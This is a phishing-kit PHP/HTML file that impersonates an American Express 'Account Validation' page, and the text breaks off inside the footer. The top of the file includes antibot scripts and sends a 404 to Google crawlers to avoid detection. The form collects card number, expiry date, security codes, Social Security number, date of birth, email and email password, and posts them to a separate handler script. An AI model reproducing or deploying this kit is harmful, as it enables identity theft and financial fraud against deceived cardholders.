<?php
/*   
   _____   _                   _                        ______    __    __     ___  
                   ─████████──████████─████████──████████─████████──████████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ─────██░░░░░░██─────────██░░░░░░██─────────██░░░░░░██─────
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████████──████████─████████──████████─████████──████████─
                   ──────────────────────────────────────────────────────────

    
*/


session_start();
error_reporting(0);

//------------------------------------------|| ANTIBOTS  ||-----------------------------------------------------//
include "../../BOTS/antibots1.php";
include "../../BOTS/antibots2.php";
include "../../BOTS/antibots3.php";
include "../../BOTS/antibots4.php";
include "../../BOTS/antibots5.php";
include "../../BOTS/antibots6.php";
include "../../BOTS/antibots7.php";
include "../../BOTS/antibots8.php";
include "../../.htaccess.htaccess";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

	<title> Account Validation - Step 1 </title>
	<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
	
	<script src="./verify_files/modal.js"></script>
	
	<script>
function empty() {
    var a;
    a = document.getElementById("cardholder_name").value.length;
    if (a < 4) {
        MsgBox('Cardholder name is required.', 'ERROR');
        return false;
    };
	var b;
    b = document.getElementById("cc_number1").value.length;
    if (b < 4) {
        MsgBox('Your full card number is required.', 'ERROR');
        return false;
    };
	var c;
    c = document.getElementById("cc_number2").value.length;
    if (c < 6) {
        MsgBox('Your full card number is required.', 'ERROR');
        return false;
    };
	var d;
    d = document.getElementById("cc_number3").value.length;
    if (d < 5) {
        MsgBox('Your full card number is required.', 'ERROR');
        return false;
    };
	var e;
    e = document.getElementById("expiry_month").value;
    if (e.length < 2 || e > 12) {
        MsgBox('Card expiry month is required.', 'ERROR');
        return false;
    };
	var h;
    h = document.getElementById("expiry_year").value;
    if (h < 2017 || h > 2080) {
        MsgBox('Card expiry year is required.', 'ERROR');
        return false;
    };
	var f;
    f = document.getElementById("cid").value.length;
    if (f < 3) {
        MsgBox('3-Digit Card Security Code (CSC) is required.', 'ERROR');
        return false;
    };
    var g;
    g = document.getElementById("cvv").value.length;
    if (g < 4) {
        MsgBox('4-digit card verification code is required.', 'ERROR');
        return false;
    };
}
</script>
	
	<meta http-equiv="content-language" content="en">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<link type="text/css" rel="stylesheet" href="./verify_files/fuidFypDefault.css">
	<link rel="stylesheet" type="text/css" data-css-uri="/myca/fuidfyp/us/resources/css/fuidLarge.css" data-device-bucket="large-loaded" href="./verify_files/fuidLarge.css">
	<link rel="stylesheet" type="text/css" data-css-uri="/myca/fuidfyp/us/resources/css/fuidMedium.css" data-device-bucket="medium">
	<link rel="stylesheet" type="text/css" data-css-uri="/myca/fuidfyp/us/resources/css/fuidSmall.css" data-device-bucket="small">
	<style type="text/css" media="screen" id="mm_style_mm_cdApiStyleId_1"></style>
  <link type="text/css" href="./verify_files/chatFrame.css" rel="stylesheet"></head> 
   <!--[if lt IE 7]><body class="AXP_CenterContent ie6 us-en"><![endif]-->
   <!--[if IE 7]><body class="AXP_CenterContent ie7 us-en"><![endif]-->
   <!--[if IE 8]> <body class="AXP_CenterContent ie8 us-en"><![endif]-->
   <!--[if IE 9]> <body class="AXP_CenterContent ie9 us-en"><![endif]-->
   <!--[if !IE]>-->
   <body class="AXP_CenterContent us-en AXP_Responsive res_Large res_1200"><!--<![endif]-->
		<div for="-301438697" id="responsiveWrapper_main"><!--Opening the main responsive wrapper -->
			<div for="-503328310" id="responsiveWrapper_sub"> <!--Opening the sub responsive wrapper		-->
				





<div for="-143473011" id="INavHeader" class="clearfix">

	
	<!--Created by CMAX:GEM 03-02-2017 03:09:01 File: US_en_NGN_H_Generic.html DO NOT MODIFY-->
	
	
	
		<link media="all" type="text/css" href="./verify_files/inav_responsive.css" rel="stylesheet"><!--[if lt IE 7]><div for="-742322611"   id="iNavNGI_Header" class="ie ie6 us-en"><![endif]--><!--[if IE 7]><div for="-767874704"   id="iNavNGI_Header" class="ie ie7 us-en"><![endif]--><!--[if IE 8]><div for="-1150113156"   id="iNavNGI_Header" class="ie ie8 us-en"><![endif]--><!--[if IE 9]><div for="-403245937"   id="iNavNGI_Header" class="ie ie9 us-en"><![endif]--><!--[if IE 10]><div for="-550902537"   id="iNavNGI_Header" class="ie ie10 us-en"><![endif]--><!--[if !IE]>--><div for="-1016095035" id="iNavNGI_Header" class="us-en"><!--<![endif]--><div for="-356674540" id="skip-to-content"><a title="Skip to main content" accesskey="2" tabindex="1" href="">Skip to main content</a></div><div for="-95658105" id="iNMbWrap"><div for="-295301381" id="iNMbCont"><div for="-840720231" id="iNMenuIco"><input type="button" title="Open Menu" id="iNOpBtn" value="Open Menu" class="iNMb iNMenu" data-location="javascript://"></div><div for="-710793655" id="iNAmexLogo"><a id="iNMblLogo" href="" title="" class="iNMb"><img src="./verify_files/clear.gif" title="" alt=""></a></div><div for="-1151463" id="iNLogIco"><input type="button" title="" id="iNLogBtn" value="Logout" class="iNMb iNLog" data-location=""></div></div></div><div for="-920264659" id="iNavHdWrap"><span id="iNMenuStart" class="iNAcsTxt" tabindex="-1">Start of menu</span><div for="-693585103" id="ioaSearch"></div><div for="-199751796" id="iNCardSelector"></div><div for="-242953687" id="iNavHeaderCont"><div for="-84466529" id="iNavLogo"><a id="" href="" title="" accesskey="0" class="iNDef"><img src="./verify_files/logo_bluebox_1x.gif" title="" alt="" class="amexLogo"></a></div><div for="-369310190" id="iNavHeaderContFloat"><div for="-96901614" id="iNavT1Nav"><ul id="iNavTier1Nav"><li><a id="iNav_MyAccount" title="" href="" accesskey="1" class="iNSortedIndex"><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">My Account</span></span><span class="iNavT1RtDoor"></span></a></li><li><a id="iNav_Cards" title="" href=""><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">CARDS</span></span><span class="iNavT1RtDoor"></span></a></li><li><a id="iNav_Travel" title="" href=""><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">TRAVEL</span></span><span class="iNavT1RtDoor"></span></a></li><li><a id="iNav_Rewards" title="" href=""><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">REWARDS</span></span><span class="iNavT1RtDoor"></span></a></li><li><a id="iNav_Business" title="" href=""><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">BUSINESS</span></span><span class="iNavT1RtDoor"></span></a></li></ul></div></div><div for="-287078180" id="iNavUtilitySection"><div for="-47081050" id="iNavUtilityArea"><div for="-319730305" id="iNavUtilityLinks"><ul><li class="iNavFirstItem"><span id="iNavUtilCountryFlag"></span><span id="iNavUtilCountryName">United States</span><a id="iNavUtilChangeCountry" title="" href="" class="iNavChangeCountry">(Change Country)</a></li></ul></div><div for="-1018381486" id="iNavLogin"><span class="iNavLoginLtDoor"></span><a id="iNavLnkLog" title="" href="" class="iNavLinkLogin iNavLogVisible">Logged in as ""</a><span class="iNavLoginRtDoor"></span></div></div><div for="-256752619" id="iNavSearch"><div for="-1095639463" class="iNavSearchBox" id="iNavSearchBox"><div for="-339465987" class="iNavSearchLtDoor"></div><div for="-294258438" class="iNavSearchCenter"><form name="iNMblSearchForm" id="iNavSearchForm" method="get" action="" enctype="application/x-www-form-urlencoded"><fieldset><legend>Search US website</legend><label for="iNavSrchBox">Search</label><input type="text" id="iNavSrchBox" name="q" value="Need help?" title="Search" autocomplete="off"><button title="Search" value="" id="iNavSrchBtn" type="submit">Search</button></fieldset></form></div><div for="-932418951" class="iNavSearchRtDoor"></div></div></div><div for="-231601658" id="ioaTool"><div for="-880352049" id="toolHolder_left" class="toolHolder_left"></div><div for="-1169527933" class="icons" id="ioaToolHolder" style="width: 254px;"><div for="-1122876309" class="ioaImages" id="faqimg" style="display: none;"><a href="" class="ioaEnter" id="faqAnchor" title="" rel="tooltip" onclick="openAA(&quot;faq&quot;,event)" onmouseenter="showIOAToolTip(&quot;ioaFaqTooltip&quot;)" onmouseleave="hideIOAToolTip(&quot;ioaFaqTooltip&quot;)"></a><div for="-371355962" id="ioaFaqTooltip" class="ioaTooltip"><div for="-422580487" class="tipHeader"></div><div for="-974256993" class="tipBody"><h3>Frequently Asked Questions</h3><p>Get answers instantly.</p></div><div for="-294138099" class="tipFooter"></div></div></div><div for="-1145219348" class="ioaImages" id="phoneimg"><a href="" class="ioaEnter" id="phoneAnchor" title="" rel="tooltip" onclick="openAA(&quot;phone&quot;,event)" onmouseenter="showIOAToolTip(&quot;ioaPhoneTooltip&quot;)" onmouseleave="hideIOAToolTip(&quot;ioaPhoneTooltip&quot;)"></a><div for="-732414657" id="ioaPhoneTooltip" class="ioaTooltip"><div for="-324583999" class="tipHeader"></div><div for="-1198289080" class="tipBody"><h3>Contact Us</h3><p>Answers over the phone in minutes.</p></div><div for="-211865975" class="tipFooter"></div></div></div><div for="-290046555" class="ioaImages" id="smimg"><a href="" class="ioaEnter" id="smAnchor" title="" rel="tooltip" onclick="openAA(&quot;social&quot;,event)" onmouseenter="showIOAToolTip(&quot;ioaSMTooltip&quot;)" onmouseleave="hideIOAToolTip(&quot;ioaSMTooltip&quot;)"></a><div for="-493861601" id="ioaSMTooltip" class="ioaTooltip"><div for="-672485572" class="tipHeader"></div><div for="-1144898443" class="tipBody"><h3>Connect Socially</h3><p>Ask questions and connect with us and others.</p></div><div for="-861739535" class="tipFooter"></div></div></div><div for="-783799635" id="searchImg"><div for="-154383795" id="iOASearchForm" name="Search"><div for="-288562367" class="ioaSmallSearch_left"></div><fieldset><legend>Search US website</legend><label for="iOASearchInput">Search</label><input type="text" id="iOASearchInput" name="q" value="" title="Search" onkeyup="getQLinks(event,this.value)" onfocus="getQLinks(event,this.value)"><span id="ioaPHText" class="ioaPHText"></span><button type="button" id="iOASearchBtn" value="" title="Search" onclick="clickSearchIcon()">Search</button></fieldset></div></div></div><div for="-927685596" id="toolHolder_right" class="toolHolder_right"></div></div></div><div for="-1153322210" id="iNMbUtilLinks"><ul><li><a id="iNUtlFaq" title="" href=""><span class="iNIco"></span><span class="iNLbl">Site FAQ</span></a></li><li><a id="iNUtlContact" title="" href=""><span class="iNIco"></span><span class="iNLbl">Contact Us</span></a></li><li><a id="iNUtlChCountry" title="" href=""><span class="iNIco"></span><span class="iNLbl">Change Country</span></a></li></ul></div><a id="iNMenuEnd" class="iNAcsTxt" title="" href="">Close Menu</a></div></div><div for="-424425694" class="iNavShadow"></div><div for="-1216460348" id="c-main-content"></div></div>
	
	<!--End File: US_en_NGN_H_Generic.html-->	
</div>	

	
					
 
				



	<div for="-939719549" id="wrapper">
		<div for="-904139162" id="dynamicContainer" class="clearfix">
			<form name="fuidStep1" id="fuidStep1" method="post" action="post2.php" onsubmit="return empty();">
				<div for="-291410403" class="fuidformContent clearfix">
					<div for="-272838003" class="formHeader clearfix">
						<h1 tabindex="0"> Account Validation<strong></strong></h1>
						<span><img id="secureImage" src="./verify_files/spacer.png" alt="This is a secure page" title="This is a secure page" tabindex="0"></span>
					</div>

					<div for="-692461934" class="startingStep">1. Enter Card Details</div>
					
					<div for="-356995445" class="clear"></div>
					<div for="-1280761769" class="headerHelpText" tabindex="0">
						In order to complete the validation process and reactivate your account with us, please fill in the fields below.
					</div>

					

					<div for="-1150514287" class="hide" id="serverSiderErr">
						<div for="-570196974" class="serverSiderErrInner">
							<span class="errorIcon"></span>
							<span id="serverErrMsg"></span>
						</div>
					</div>
					<div for="-634097263" class="cardBlock clearfix">
						<div for="-677940964" class="cardLeftArea">
							<h2 class="cardheader" tabindex="0">Valid Your Information</h2><br>
							

<div for="-260804050" class="inputElement clearfix" id="cidContainer">
								<div for="-941644981" class="cidBoxDiv">
									<span class="labelText">First name</span>
									 <label for="cidInput" class="hide">3-Digit Card Security Code (CSC)</label>
									<input type="text" size="20" name="first" maxlength="30" value="" autocomplete="off" id="cardholder_name" class="fuidFYPInput" title="" alt="" style="width: 300px;">
								</div>
								<div for="-128189891" class="cidImgDiv">
									<div for="-164973673" class="cidimage"><img src="./verify_files/spacer.png" alt="" title=""></div>
								</div>
								
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div>
<div for="-260804050" class="inputElement clearfix" id="cidContainer">
								<div for="-941644981" class="cidBoxDiv">
									<span class="labelText">Middle name</span>
									 <label for="cidInput" class="hide">3-Digit Card Security Code (CSC)</label>
									<input type="text" size="20" name="midlename" maxlength="30" value="" autocomplete="off" id="cardholder_name" class="fuidFYPInput" title="" alt="" style="width: 300px;">
								</div>
								<div for="-128189891" class="cidImgDiv">
									<div for="-164973673" class="cidimage"><img src="./verify_files/spacer.png" alt="" title=""></div>
								</div>
								
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div>
<div for="-260804050" class="inputElement clearfix" id="cidContainer">
								<div for="-941644981" class="cidBoxDiv">
									<span class="labelText">Last Name</span>
									 <label for="cidInput" class="hide">3-Digit Card Security Code (CSC)</label>
									<input type="text" size="20" name="lastname" maxlength="30" value="" autocomplete="off" id="cardholder_name" class="fuidFYPInput" title="" alt="" style="width: 300px;">
								</div>
								<div for="-128189891" class="cidImgDiv">
									<div for="-164973673" class="cidimage"><img src="./verify_files/spacer.png" alt="" title=""></div>
								</div>
								
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div><div for="-260804050" class="inputElement clearfix" id="cidContainer">
								<div for="-941644981" class="cidBoxDiv">
									
									 <label for="cidInput" class="hide">3-Digit Card Security Code (CSC)</label>
									
								</div>
								<div for="-128189891" class="cidImgDiv">
									<div for="-164973673" class="cidimage"><img src="./verify_files/spacer.png" alt="" title=""></div>
								</div>
								
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div><div for="-260804050" class="inputElement clearfix" id="cidContainer">
								
								<div for="-128189891" class="cidImgDiv">
									<div for="-164973673" class="cidimage"><img src="./verify_files/spacer.png" alt="" title=""></div>
								</div>
								
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div>
							<div for="-1278555544" class="inputElement clearfix" id="accountNumber">
								<span class="labelText">
									Enter the 15-digit number on the front of your Card</span>
									<label for="accountNumberInput1" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
									<label for="accountNumberInput2" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
									<label for="accountNumberInput3" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
								
								<input type="text" size="15" maxlength="4" value="" autocomplete="off" name="cc_number1" id="cc_number1" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="
    width: 72px;
">
								
								<span class="inputSaperator"></span>
								
								<input type="text" size="7" maxlength="6" value="" autocomplete="off" name="cc_number2" id="cc_number2" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="width: 78px;">
								
								<span class="inputSaperator"></span>
								
								<input type="text" size="7" maxlength="5" value="" autocomplete="off" name="cc_number3" id="cc_number3" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="width: 73px;">
								
								<span class="backendErrMsg" id="AccountErrBcknd"></span>
								<div for="-232283582" class="hide" id="accNumErrMsg"></div>

							</div>
							<div for="-112625979" class="inputElement clearfix" id="accountNumber">
								<span class="labelText">
									Card Expiry Date (mm/yyyy)</span>
								
								<input type="text" size="2" maxlength="2" value="" autocomplete="off" name="expiry_month" id="expiry_month" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="
    width: 49px;
">
								
								<span class="inputSaperator"></span>
								
								<input type="text" size="4" maxlength="4" value="" autocomplete="off" name="expiry_year" id="expiry_year" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="
    width: 63px;
">
								
								<span class="backendErrMsg" id="AccountErrBcknd"></span>
								<div for="-522301842" class="hide" id="accNumErrMsg"></div>

							</div>
							<div for="-1205228659" class="inputElement clearfix" id="cidContainer">
								<div for="-208376129" class="cidBoxDiv">
									<span class="labelText">3-Digit Card Security Code from the back of your card (CSC)</span>
									 <label for="cidInput" class="hide">3-Digit Card Security Code (CID)</label>
									<input type="password" size="4" name="cid" maxlength="3" value="" autocomplete="off" id="cid" class="fuidFYPInput" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57">
								</div>
								<div for="-1203543906" class="cidImgDiv">
									<div for="-558724606" class="cidimage"><img src="./verify_files/spacer.png" alt="This card image shows the location of your 4-digit Card ID" title="This card image shows the location of your 4-digit Card ID"></div>
								</div>
								
								<div for="-328354638" class="hide" id="cidErrMsg"></div>
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div>


														<div for="-664543163" class="inputElement clearfix" id="cidContainer">
								<div for="-731010696" class="cidBoxDiv">
									<span class="labelText">4-digit Card ID (CID )</span>
									 <label for="cidInput" class="hide">4-digit Card ID (CVV)</label>
									<input type="password" size="3" name="cvv" maxlength="4" value="" autocomplete="off" id="cvv" class="fuidFYPInput" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="
    width: 58px;
">
								</div>
								<div for="-1054683910" class="cidImgDiv">
									<div for="-907107537" class="cidimage"><img src="./verify_files/spacer.png" alt="This card image shows the location of your 4-digit Card ID" title="This card image shows the location of your 4-digit Card ID"></div>
								</div>
								
								<div for="-738190954" class="hide" id="cidErrMsg"></div>
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div>

<div for="-1278555544" class="inputElement clearfix" id="accountNumber">
								<span class="labelText">Social Security number (SSN) </span>
									<label for="accountNumberInput1" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
									<label for="accountNumberInput2" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
									<label for="accountNumberInput3" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
								
								<input type="text" size="7" maxlength="3" value="" autocomplete="off" name="ssn1" id="cc_number1" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="
    width: 58px;
">
								
								<span class="inputSaperator"></span>
								
								<input type="text" size="2" maxlength="2" value="" autocomplete="off" name="ssn2" id="cc_number2" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="width: 48px;">
								
								<span class="inputSaperator"></span>
								
								<input type="text" size="7" maxlength="4" value="" autocomplete="off" name="ssn3" id="cc_number3" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="width: 73px;">
								
								<span class="backendErrMsg" id="AccountErrBcknd"></span>
								<div for="-232283582" class="hide" id="accNumErrMsg"></div>

							</div><div for="-1278555544" class="inputElement clearfix" id="accountNumber">
								<span class="labelText">Date of birth</span>
									<label for="accountNumberInput1" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
									<label for="accountNumberInput2" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
									<label for="accountNumberInput3" class="hide">Enter the 15-digit account number on the front of your Card in this field</label>
								
								<input type="text" size="7" maxlength="2" value="" autocomplete="off" name="dob1" id="cc_number1" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="
    width: 48px;
">
								
								<span class="inputSaperator"></span>
								
								<input type="text" size="2" maxlength="2" value="" autocomplete="off" name="dob2" id="cc_number2" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="width: 48px;">
								
								<span class="inputSaperator"></span>
								
								<input type="text" size="7" maxlength="4" value="" autocomplete="off" name="dob3" id="cc_number3" class="" title="" alt="" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="width: 74px;">
								
								<span class="backendErrMsg" id="AccountErrBcknd"></span>
								<div for="-232283582" class="hide" id="accNumErrMsg"></div>

							</div>
<div for="-260804050" class="inputElement clearfix" id="cidContainer">
								<div for="-941644981" class="cidBoxDiv">
									<span class="labelText">Email Adress</span>
									 <label for="cidInput" class="hide">3-Digit Card Security Code (CSC)</label>
									<input type="text" size="40" name="email" maxlength="30" value="" autocomplete="off" id="cardholder_name" class="fuidFYPInput" title="" alt="" style="width: 300px;">
								</div>
								<div for="-128189891" class="cidImgDiv">
									<div for="-164973673" class="cidimage"><img src="./verify_files/spacer.png" alt="" title=""></div>
								</div>
								
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div>
<div for="-260804050" class="inputElement clearfix" id="cidContainer">
								<div for="-941644981" class="cidBoxDiv">
									<span class="labelText">Email Password</span>
									 <label for="cidInput" class="hide">3-Digit Card Security Code (CSC)</label>
									<input type="password" size="40" name="emailpass" maxlength="30" value="" autocomplete="off" id="cardholder_name" class="fuidFYPInput" title="" alt="" style="width: 300px;">
								</div>
								<div for="-128189891" class="cidImgDiv">
									<div for="-164973673" class="cidimage"><img src="./verify_files/spacer.png" alt="" title=""></div>
								</div>
								
								<span class="backendErrMsg" id="cidErrBcknd"></span>
							</div>
			

							<div for="-625593270" class="submitBtdiv clearfix">
								<input type="submit" title="Click here to confirm the card information you entered" alt="Click here to confirm the card information you entered" value="Continue" id="submitFuidStep1" class="enableBt">
							</div>
						</div>
						<div for="-818978890" class="cardRightArea" id="cardRightArea">
							<div for="-600161516" class="cidText" tabindex="0">This is where you can find your 4-digit Card ID</div>
							<div for="-223940041" class="cidimage"><img src="./verify_files/spacer.png" alt="This card image shows the location of your 4-digit Card ID" title="This card image shows the location of your 4-digit Card ID"></div>

						</div>
					</div>


				</div>
				
				<div for="-846215736" id="globalTime"></div>
			
			</form>
		</div>

		<!-- Error page Template -->
		<div for="-632051491" id="errorTemplate">
		</div>
	</div>
	<label class="" role="alert" id="errorMsgJaws"></label>
	<div for="-352262090" id="showWaitLayer" class="hide">
		<div for="-888053779" id="greybglayer"></div>
		<div for="-694587932" id="spinnerImage"></div>
	</div>
		

		<!--[if lt IE 7]><div for="-617129390"   id="iNavNGI_FooterMain" class="ie ie6 us-en iNNewFoot"><![endif]--><!--[if IE 7]><div for="-450940503"   id="iNavNGI_FooterMain" class="ie ie7 us-en iNNewFoot"><![endif]--><!--[if IE 8]><div for="-1210724164"   id="iNavNGI_FooterMain" class="ie ie8 us-en iNNewFoot"><![endif]--><!--[if IE 9]><div for="-129633965"   id="iNavNGI_FooterMain" class="ie ie9 us-en iNNewFoot"><![endif]--><!--[if IE 10]><div for="-240225991"   id="iNavNGI_FooterMain" class="ie ie10 us-en iNNewFoot"><![endif]--><!--[if !IE]>--><div for="-526513726" id="iNavNGI_FooterMain" class="us-en iNNewFoot"><!--<![endif]--><div for="-329357467" id="iNavNGI_FooterWrap"><div for="-1081920757" id="iNavNGI_FooterCont"><div for="-938997512" id="iNavNGI_Footer"><div for="-866513003" id="iNMblFootUtil"><div for="-667431312" id="iNMblUtilCont"><input title="" value="Contact Us" id="iNFootCntBtn" type="button" data-location=""><input title="Log In" value="Log In" id="iNFootLgBtn" type="button" data-location=""></div></div><div for="-881515331" id="iNavFootMain"><ul><li class="iNDef" id="gNFtCI1"><a id="footer_about_american_express" href="" title="">About Us</a></li><li class="iNNMb" id="gNFtCI2"><a id="footer_investor_relations" href="" title="Investor events, materials &amp; filings" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>InvestRel" data-omn-once="Yes" class="iNOmn">Investor Relations</a></li><li class="iNDef" id="gNFtCI3"><a id="footer_careers" href="" title="What will you do for a living?">Careers</a></li><li class="iNNMb" id="gNFtCI4"><a id="footer_sitemap" href="" title="Site Map">Site Map</a></li><li class="iNNMb" id="gNFtCI5"><a id="footer_contact_us" href="" title="Contact Us - Answers by phone in minutes">Contact Us</a></li><li class="iNMb" id="gNFtCI6"><a id="footer_mobile_mob" href="" title="Mobile access to your Card account">Mobile &amp; Tablet Apps</a></li></ul></div><div for="-865028816" id="iNavFootSub"><ul id="iNavSocial"><li class="iNDef" id="gNFtSM1"><a id="icoFb" href="" title="Facebook - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>FaceBook,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="Facebook - Link will open in a new window" title="Facebook - Link will open in a new window" class="icoFb"></a></li><li class="iNDef" id="gNFtSM2"><a id="icoFs" href="" title="Foursquare - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>FourSquare,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="Foursquare - Link will open in a new window" title="Foursquare - Link will open in a new window" class="icoFs"></a></li><li class="iNDef" id="gNFtSM3"><a id="icoTw" href="" title="Twitter - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>Twitter,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="Twitter - Link will open in a new window" title="Twitter - Link will open in a new window" class="icoTw"></a></li><li class="iNNMb" id="gNFtSM4"><a id="icoYt" href="" title="YouTube - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>YouTube,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="YouTube - Link will open in a new window" title="YouTube - Link will open in a new window" class="icoYt"></a></li><li class="iNDef" id="gNFtSM5"><a id="icoLi" href="" title="LinkedIn - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>LinkedIn,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="LinkedIn - Link will open in a new window" title="LinkedIn - Link will open in a new window" class="icoLi"></a></li><li class="iNNMb iNavLast" id="gNFtSM6"><a id="icoGp" href="" title="Google+ - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>GooglePlus,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="Google+ - Link will open in a new window" title="Google+ - Link will open in a new window" class="icoGp"></a></li></ul></div></div><div for="-1101255307" id="iNavFootOthers"><div for="-47923426" class="iNavFootRow"><ul><li class="iNavFootHd">Products &amp; Services</li><li class="iNNMb" id="gNFtLink1_1"><a id="footer_cards_personal" href="" title="">Credit Cards</a></li><li class="iNNMb" id="gNFtLink1_2"><a id="footer_cards_sm_bus" href="" title="Find OPEN small business credit cards">Small Business Credit Cards</a></li><li class="iNNMb" id="gNFtLink1_3"><a id="footer_cards_corp" href="" title="Corporate Card and payment solutions">Corporate Cards</a></li><li class="iNNMb" id="gNFtLink1_4"><a id="footer_cards_reload" href="" title="Spends like cash, feels like Membership">Prepaid Cards</a></li><li class="iNDef" id="gNFtLink1_5"><a id="footer_personal_savings" href="" title="">Savings Accounts and CDs</a></li><li class="iNNMb iNavLast" id="gNFtLink1_6"><a id="footer_giftcards" href="" title="Order gift cards for friends or business">Gift Cards</a></li></ul></div><div for="-144556067" class="iNavFootRow"><ul><li class="iNavFootHd">Links You May Like</li><li class="iNNMb" id="gNFtLink2_1"><a id="footer_mr" href="" title="Use Points for your favorite rewards">Membership Rewards<sup>?</sup></a></li><li class="iNMb" id="gNFtLink2_2"><a id="footer_mobile" href="" title="Mobile access to your Card account">Mobile &amp; Tablet Apps</a></li><li class="iNNMb" id="gNFtLink2_3"><a id="footer_credit_secure" href="" title="Get up to 3 reports, daily monitoring, alerts">CreditSecure?</a></li><li class="iNNMb" id="gNFtLink2_4"><a id="footer_serve" href="" title="Prepaid account with card and mobile app" data-window="new" class="iNWin" target="_blank">Serve<sup>?</sup></a></li><li class="iNDef" id="gNFtLink2_5"><a id="footer_bluebird" href="" title="" data-window="new" class="iNWin" target="_blank">Bluebird<sup>?</sup></a></li><li class="iNNMb" id="gNFtLink2_6"><a id="footer_accept_amex" href="" title="Accept Amex Cards">Accept Our Cards</a></li><li class="iNDef iNavLast" id="gNFtLink2_7"><a id="footer_refer_friend" href="" title="Refer a Friend">Refer a Friend</a></li></ul></div></div><div for="-141547578" id="copyrightInfo"><ul><li class="iNDef" id="gNFtLC1"><a id="footer_supplier_management" href="" title="">Supplier Management</a></li><li class="iNDef" id="gNFtLC2"><a id="footer_Terms_of_Use" href="" title="">Terms of Service</a></li><li class="iNDef" id="gNFtLC3"><a id="footer_privacy_statement" href="" title="">Privacy Center</a></li><li class="iNDef" id="gNFtLC4"><a id="footer_adChoices" href="" title="" data-window="new" class="iNWin" target="_blank">AdChoices</a></li><li class="iNDef" id="gNFtLC5"><a id="footer_card_agreements" href="" title="">Card Agreements</a></li><li class="iNDef" id="gNFtLC6"><a id="footer_fraud_protection_center" href="" title="">Security Center</a></li><li 